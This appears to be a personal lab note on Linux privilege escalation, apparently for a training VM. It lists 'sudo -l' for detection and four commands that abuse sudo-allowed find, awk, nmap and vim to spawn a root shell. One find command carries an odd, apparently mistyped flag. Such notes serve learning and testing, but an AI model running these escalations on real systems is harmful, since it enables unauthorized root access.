
## Detection

**Linux VM**

1. List the programs that can run via sudo:
   ```bash
   sudo -l
   ```

![[Pasted image 20240905215953.png]]
## Exploitation

**Linux VM**

1. Execute one of the following commands to spawn a root shell:

a. 
   ```bash
      sudo find /bin -ne nano -exec /bin/sh \;
      ```
![[Pasted image 20240905220124.png]]


b. 
   ```bash
      sudo awk 'BEGIN {system("/bin/sh")}'
      ```

![[Pasted image 20240905220138.png]]

c. 
```
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```
![[Pasted image 20240905220254.png]]


d.

```bash
sudo vim -c '!sh' 
```

# ![[Pasted image 20240905221016.png]]

